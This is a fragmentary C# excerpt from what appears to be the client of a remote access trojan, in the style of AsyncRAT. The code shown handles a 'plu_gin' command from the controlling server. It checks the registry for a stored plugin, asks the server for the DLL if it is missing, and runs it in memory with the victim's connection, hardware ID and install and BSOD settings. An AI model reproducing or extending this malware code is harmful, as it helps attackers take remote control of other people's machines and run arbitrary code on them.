...
namespace Client.Connection
{
    public static class ClientSocket
    {
                    ...
                    case "plu_gin": // run plugin in memory
                        {
                            try
                            {
                                string dllstr = unpack_msgpack.ForcePathObject("Dll").AsString;
                                
                                if (SetRegistry.GetValue(dllstr) == null) // check if plugin is installed
                                {
                                    Packs.Add(unpack_msgpack); //save it for later
                                    MsgPack msgPack = new MsgPack();
                                    msgPack.ForcePathObject("Pac_ket").SetAsString("sendPlugin");
                                    msgPack.ForcePathObject("Hashes").SetAsString(dllstr);
                                    ClientSocket.Send(msgPack.Encode2Bytes());
                                }
                                else
        ...
        private static void Invoke(MsgPack unpack_msgpack)
        {
            ...
            instance.Run(ClientSocket.TcpClient, Settings.Server_Certificate, 
                Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
            Received();
        }
